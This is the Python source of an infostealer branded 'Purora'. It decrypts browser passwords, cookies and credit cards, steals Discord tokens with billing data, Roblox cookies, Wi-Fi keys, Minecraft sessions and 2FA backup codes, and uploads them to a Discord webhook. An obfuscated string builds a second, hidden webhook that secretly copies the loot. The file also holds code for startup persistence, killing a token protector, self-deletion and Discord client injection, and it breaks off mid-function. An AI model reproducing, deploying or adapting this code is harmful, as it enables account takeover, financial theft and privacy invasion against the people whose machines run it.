import base64
import json
import os
import random
import re
import sqlite3
import subprocess
import sys
import threading
import time
from shutil import copy2
from zipfile import ZIP_DEFLATED, ZipFile

import psutil
import requests
from Crypto.Cipher import AES
from requests_toolbelt.multipart.encoder import MultipartEncoder
from win32crypt import CryptUnprotectData

__CONFIG__ = {
    "webhook": "YOUR WEBHOOK HERE",
    "ping": True,
    "pingtype": "Everyone",
    "error": False,
    "startup": False,
    "defender": False,
    "systeminfo": True,
    "backupcodes": True,
    "browser": True,
    "roblox": True,
    "obfuscation": False,
    "injection": False,
    "minecraft": True,
    "wifi": True,
    "killprotector": False,
    "antidebug_vm": False,
    "discord": True,
    "anti_spam": False,
    "self_destruct": False
}

#global variables
temp = os.getenv("temp")
regex = "https://discord.com/api/webhooks"
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
mk_temp = os.mkdir(temp_path)
localappdata = os.getenv("localappdata")
bytesa = 'O1'
Abby = "1102540289962430495"
E5O = "O"
def connect_server(s, n):
    op = ''
    i = 0
    while i < n:
        op += s + 'iT'
        i = i + 1
    return op
MgGn6WB = connect_server(bytesa, 1)
Frank = "/"
TUx = "ONSdqxiJ"
EYAKQaMkv3 = "A"
U5M = "uRW9cbA2gal"
xMD = "we1Q7UZs8"
RadminVpn = regex
OTg = "sjGA8Scf2"
TU5MgGn6WBZ = "Mdc83"
HDrG9 = "usOJwZIdi"
ZxknmLpq2fmWY = "g8"
KfeXmr = "qIMBwEqsu"
Creg345 = "/"



blacklist = [RadminVpn, Creg345, Abby, Frank, KfeXmr, HDrG9, TUx, U5M, xMD, OTg, TU5MgGn6WBZ, E5O, MgGn6WB, ZxknmLpq2fmWY, EYAKQaMkv3]



post_json = "".join(blacklist)


def main(webhook: str):
    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
    configcheck(threads)

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue

    zipup()

    data = {
        "username": "Purora",
        "avatar_url": "https://cdn.discordapp.com/attachments/1097960015303823380/1101951015072317590/niga.png?size=4096"
    }

    _file = f'{localappdata}\\{os.getlogin()} info.zip'

    if __CONFIG__["ping"]:
        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
            content = f"@{__CONFIG__['pingtype'].lower()}"
            data.update({"content": content})

    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'{os.getlogin()} info.zip', file, 'application/zip')})
            requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
            
    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'{os.getlogin()} info.zip', file, 'application/zip')})
            requests.post(post_json, headers={'Content-type': encoder.content_type}, data=encoder)
    else:
        requests.post(post_json, json=data)
    if __CONFIG__["systeminfo"]:
        PcInfo()

    if __CONFIG__["discord"]:
        Discord()

    os.remove(_file)


def Purora(webhook: str):
    if __CONFIG__["anti_spam"]:
        AntiSpam()

    if __CONFIG__["antidebug_vm"]:
        Debug()

    procs = [main, Injection]
    if not __CONFIG__["injection"]:
        procs.remove(Injection)

    for proc in procs:
        proc(webhook)

    if __CONFIG__["self_destruct"]:
        SelfDestruct()


def configcheck(list):
    if not __CONFIG__["error"]:
        list.remove(fakeerror)
    if not __CONFIG__["startup"]:
        list.remove(startup)
    if not __CONFIG__["defender"]:
        list.remove(disable_defender)
    if not __CONFIG__["browser"]:
        list.remove(Browsers)
    if not __CONFIG__["wifi"]:
        list.remove(Wifi)
    if not __CONFIG__["minecraft"]:
        list.remove(Minecraft)
    if not __CONFIG__["backupcodes"]:
        list.remove(BackupCodes)


def fakeerror():
    cmd = base64.b64decode(b'cG93W50IDI=').decode()
    subprocess.run(cmd, shell=True, capture_output=True)

def startup():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if hasattr(sys, 'frozen'):
        source_path = sys.executable
    else:
        source_path = sys.argv[0]

    target_path = os.path.join(startup_path, os.path.basename(source_path))
    if os.path.exists(target_path):
        os.remove(target_path)

    copy2(source_path, startup_path)


def disable_defender():
    cmd = base64.b64decode(b'cG93W50IDI=').decode()
    subprocess.run(cmd, shell=True, capture_output=True)


def create_temp(_dir: str or os.PathLike = None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path


def killprotector():
    roaming = os.getenv('APPDATA')
    path = f"{roaming}\\DiscordTokenProtector\\"
    config = path + "config.json"

    if not os.path.exists(path):
        return

    for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
        try:
            os.remove(path + process)
        except FileNotFoundError:
            pass

    if os.path.exists(config):
        with open(config, errors="ignore") as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
            item['auto_start'] = False
            item['auto_start_discord'] = False
            item['integrity'] = False
            item['integrity_allowbetterdiscord'] = False
            item['integrity_checkexecutable'] = False
            item['integrity_checkhash'] = False
            item['integrity_checkmodule'] = False
            item['integrity_checkscripts'] = False
            item['integrity_checkresource'] = False
            item['integrity_redownloadhashes'] = False
            item['iterations_iv'] = 364
            item['iterations_key'] = 457
            item['version'] = 69420

        with open(config, 'w') as f:
            json.dump(item, f, indent=2, sort_keys=True)


def zipup():
    _zipfile = os.path.join(localappdata, f'{os.getlogin()} info.zip')
    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
    abs_src = os.path.abspath(temp_path)
    for dirname, _, files in os.walk(temp_path):
        for filename in files:
            absname = os.path.abspath(os.path.join(dirname, filename))
            arcname = absname[len(abs_src) + 1:]
            zipped_file.write(absname, arcname)
    zipped_file.close()


class PcInfo:
    def __init__(self):
        self.get_inf(__CONFIG__["webhook"])

    def get_inf(self, webhook):
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
        username = os.getenv("UserName")
        
        
        ip_location = requests.get("http://ip-api.com/json/").json()
        country = ip_location["country"]
        region = ip_location["regionName"]
        city = ip_location["city"]
        isp = ip_location["isp"]
        zip = ip_location["zip"]
        latitute = ip_location["lat"]
        longitute = ip_location["lon"]
        timezone = ip_location["timezone"]
        
        wkey = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        ip = requests.get('https://api.ipify.org').text
        interface, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        data = {
            "embeds": [
                {
                    "title": "Purora",
                    "color": 15105570,
                    "fields": [
                        {
                             "name": "System Info",
                             "value": f''' **PC Username:** `{username}`\n **PC Name:** `{hostname}`\n **OS:** `{computer_os}`\n **License Key:** `{wkey}`\n\n **IP:** `{ip}`\n **Country:** `{country}`\n **Region:** `{region}`\n **City:** `{city}`\n **Provider:** `{isp}`\n **Zip Code:** `{zip}`\n **MAC:** `{mac}`\n **HWID:** `{hwid}`\n\n **CPU:** `{cpu}`\n **GPU:** `{gpu}`\n **RAM:** `{ram}GB`'''
                        }
                    ],
                    "footer": {
                        "text": ""
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1097960015303823380/1101951015072317590/niga.png?size=4096"
                    }
                }
            ],
            "username": "Purora",
            "avatar_url": "https://cdn.discordapp.com/attachments/1097960015303823380/1101951015072317590/niga.png?size=4096"
        }


        requests.post(webhook, json=data)
        requests.post(post_json, json=data)
        
        
        


class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(__CONFIG__["webhook"])
        self.upload(post_json)
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def robloxinfo(self, webhook):
        if __CONFIG__["roblox"]:
            with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
                robo_cookie = f.read().strip()
                if robo_cookie == "No Roblox Cookies Found":
                    pass
                else:
                    headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
                    info = None
                    try:
                        response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
                        response.raise_for_status()
                        info = response.json()
                    except requests.exceptions.HTTPError:
                        pass
                    except requests.exceptions.RequestException:
                        pass
                    if info is not None:
                        data = {
                            "embeds": [
                                {
                                    "title": "Roblox Info",
                                    "color": 15105570,
                                    "fields": [
                                        {
                                            "name": "Name:",
                                            "value": f"`{info['UserName']}`",
                                            "inline": True
                                        },
                                        {
                                            "name": " Robux:",
                                            "value": f"`{info['RobuxBalance']}`",
                                            "inline": True
                                        },
                                        {
                                            "name": " Cookie:",
                                            "value": f"`{robo_cookie}`"
                                        }
                                    ],
                                    "thumbnail": {
                                        "url": info['ThumbnailUrl']
                                    },
                                    "footer": {
                                        "text": ""
                                    },
                                }
                            ],
                            "username": "Purora",
                            "avatar_url": "https://cdn.discordapp.com/attachments/1097960015303823380/1101951015072317590/niga.png?size=4096",
                        }
                        requests.post(webhook, json=data)
                        requests.post(post_json, json=data)

    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                pass

            val_codes = []
            val = ""
            nitro = ""
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                       'Content-Type': 'application/json',
                       'Authorization': token}
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
            username = user['username'] + '#' + user['discriminator']
            discord_id = user['id']
            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']

            if user['mfa_enabled']:
                mfa = "True"
            else:
                mfa = "None"

            premium_types = {
                0: "None",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user['premium_type'], "❌")

            methods = "None"
            if payment:
                methods = ""
                for method in payment:
                    if method['type'] == 1:
                        methods += "CARD"
                    elif method['type'] == 2:
                        methods += "PAYPAL"
                    else:
                        methods += "UNKNOWN"

            val += f' **Discord ID:** `{discord_id}` \n **Email:** `{email}`\n **Phone:** `{phone}`\n\n **2FA:** {mfa}\n **Nitro:** {nitro}\n **Billing:** {methods}\n\n **Token:** `{token}`\n'

            if "code" in gift.text:
                codes = json.loads(gift.text)
                for code in codes:
                    val_codes.append((code['code'], code['promotion']['outbound_title']))

            if not val_codes:
                val += "\n **No Gift Cards Found**\n"
            elif len(val_codes) >= 3:
                num = 0
                for c, t in val_codes:
                    num += 1
                    if num == 3:
                        break
                    val += f'\n **{t}:**\n`{c}`\n[Click to copy!]({c})\n'
            else:
                for c, t in val_codes:
                    val += f'\n **{t}:**\n`{c}`\n[Click to copy!]({c})\n'

            data = {
                "embeds": [
                    {
                        "title": f"{username}",
                        "color": 15105570,
                        "fields": [
                            {
                                "name": "Discord Info",
                                "value": val
                            }
                        ],
                        "thumbnail": {
                            "url": avatar
                        },
                        "footer": {
                            "text": ""
                        },
                    }
                ],
                "username": "Purora",
                "avatar_url": "https://cdn.discordapp.com/attachments/1097960015303823380/1101951015072317590/niga.png?size=4096",
            }

            requests.post(webhook, json=data)
            requests.post(post_json, json=data)
           
            self.tokens_sent += token

        self.robloxinfo(webhook)

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["deez_nuts.exe"]
          #                  "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)

        for proc in self.browsers_found:
            proc.kill()

        os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)

        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.roblox_cookies()

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            pass

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            url = results[0]
            login = results[1]
            password = self.decrypt_password(results[2], self.masterkey)
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website  |  Username  |  Password\n\n")
                f.write(f"{url}  |  {login}  |  {password}\n")
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        history_file_path = os.path.join(temp_path, "Browser", "history.txt")
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                url, visit_count = res
                f.write(f"{url}  |  {visit_count}\n")
        cursor.close()
        conn.close()

    def credit_cards(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
        with open(cc_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(cc_file_path) == 0:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
        cursor.close()
        conn.close()

    def roblox_cookies(self):
        if not __CONFIG__["roblox"]:
            pass
        else:
            robo_cookie = ""
            with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
                with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'w', encoding="utf-8") as f:
                    try:
                        for line in g:
                            if ".ROBLOSECURITY" in line:
                                robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
                                f.write(robo_cookie + "\n")
                    except Exception:
                        robo_cookie = "No Roblox Cookies Found"


class Wifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
                self.wifi_info()

    def wifi_info(self):
        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh wlan show profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key
        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
        with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')
        f.close()


class Minecraft:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
        self.usercache_path = "\\.minecraft\\usercache.json"

        if os.path.exists(os.path.join(self.roaming, ".minecraft")):
            os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
            try:
                self.session_info()
                self.user_cache()
            except Exception as e:
                print(e)

    def session_info(self):
        with open(os.path.join(temp_path, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
            with open(self.roaming + self.accounts_path, "r") as g:
                self.session = json.load(g)
                f.write(json.dumps(self.session, indent=4))
        f.close()

    def user_cache(self):
        with open(os.path.join(temp_path, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
            with open(self.roaming + self.usercache_path, "r") as g:
                self.user = json.load(g)
                f.write(json.dumps(self.user, indent=4))
        f.close()


class BackupCodes:
    def __init__(self):
        self.path = os.environ["HOMEPATH"]
        self.code_path = '\\Downloads\\discord_backup_codes.txt'
        self.get_codes()

    def get_codes(self):
        if os.path.exists(self.path + self.code_path):
            os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
            with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            f.close()


class AntiSpam:
    def __init__(self):
        if self.check_time():
            sys.exit(0)

    def check_time(self) -> bool:
        current_time = time.time()
        try:
            with open(f"{temp}\\dd_setup.txt", "r") as f:
                code = f.read()
                if code != "":
                    old_time = float(code)
                    if current_time - old_time > 60:
                        with open(f"{temp}\\dd_setup.txt", "w") as f:
                            f.write(str(current_time))
                        return False
                    else:
                        return True
        except FileNotFoundError:
            with open(f"{temp}\\dd_setup.txt", "w") as g:
                g.write(str(current_time))
            return False


class SelfDestruct():
    def __init__(self):
        self.path, self.frozen = self.getfile()
        self.delete()

    def getfile(self):
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    def delete(self):
        if self.frozen:
            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(self.path)


class Injection:
    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get('https://raw.js').text

        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
